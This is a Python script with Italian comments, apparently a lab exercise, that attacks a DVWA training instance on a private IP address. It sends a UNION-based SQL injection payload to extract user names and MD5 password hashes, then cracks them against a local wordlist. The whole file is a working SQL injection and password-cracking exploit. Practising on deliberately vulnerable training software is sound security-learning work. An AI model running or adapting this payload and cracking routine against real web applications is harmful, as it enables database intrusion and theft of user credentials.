import hashlib  # Importa il modulo hashlib per eseguire operazioni di hash
import requests  # Importa il modulo requests per effettuare richieste HTTP
import urllib3  # Importa il modulo urllib3 per gestire le richieste HTTP
from bs4 import BeautifulSoup  # Importa la classe BeautifulSoup dal modulo bs4 per il parsing dell'HTML

URL = "http://192.168.66.120/dvwa/vulnerabilities/sqli/"  
CUSTOM_HEADERS = {"Cookie": "security=low; PHPSESSID=83701921837e0140ef4a8c757b5a0cc3"}  
payload = ["' UNION SELECT first_name, password FROM users # "]

def confronta_hash(password, hash_da_decriptare):  # Funzione per confrontare una password decriptata con l'hash da decriptare
    m = hashlib.md5()  # Crea un oggetto di hashing MD5
    m.update(password.encode())  # Aggiorna l'hash con la password codificata
    if m.hexdigest() == hash_da_decriptare:  # Confronta l'hash calcolato con l'hash da decriptare
        return True  # Restituisce True se l'hash corrisponde
    else:
        return False  # Restituisce False se l'hash non corrisponde

def exploit_sqli(payload):  # Funzione per eseguire l'exploit di SQL injection con un determinato payload
    params = {"id": payload, "Submit": "Submit"}  # Parametri della richiesta GET con il payload
    r = requests.get(URL, params=params, headers=CUSTOM_HEADERS)  # Effettua la richiesta GET al sito web con i parametri e gli header personalizzati
    soup = BeautifulSoup(r.text, "html.parser")  # Parsa l'HTML della risposta
    div = soup.find("div", {"class": "vulnerable_code_area"})  # Trova l'elemento div con la classe "vulnerable_code_area"

    if not div:  # Se l'elemento div non viene trovato, si verifica un errore
        print("payload =", payload)
        print("errore =", r.text)
        return []
    return div.find_all("pre")  # Restituisce tutti gli elementi pre all'interno dell'elemento div

def main():
    with open('/home/kali/Desktop/passwords.txt', 'r') as file:  # Apre il file "passwords.txt" in modalità lettura e lo assegna a una variabile
        passwords = file.read().splitlines()  # Legge il contenuto del file e divide le righe in una lista di password

    results = exploit_sqli(payload)  # Esegue l'exploit di SQL injection con il payload corrente

    if len(results) > 0:  # Se results non è vuoto continua l'esecuzione del programma
        print("payload =", payload)

        for res in results:  # Cicla attraverso i risultati ottenuti dall'exploit
           
            l = res.decode_contents().split("<br/>")  # Decodifica il contenuto dell'elemento pre e divide le righe in una lista
            hash_line = l[2].strip()  # Seleziona la terza riga e rimuove gli spazi bianchi iniziali e finali
            hash_da_decriptare = hash_line.split(": ")[1].strip()  # Divide la riga in base al delimitatore ":" e seleziona la seconda parte senza spazi bianchi
            for password in passwords:  # Cicla attraverso le password lette dal file 
                if confronta_hash(password, hash_da_decriptare):  # Confronta la password decriptata con l'hash da decriptare
                    print(f"   {l[1]}, Password trovata: {password} ====> ({hash_da_decriptare})")
                    break

main()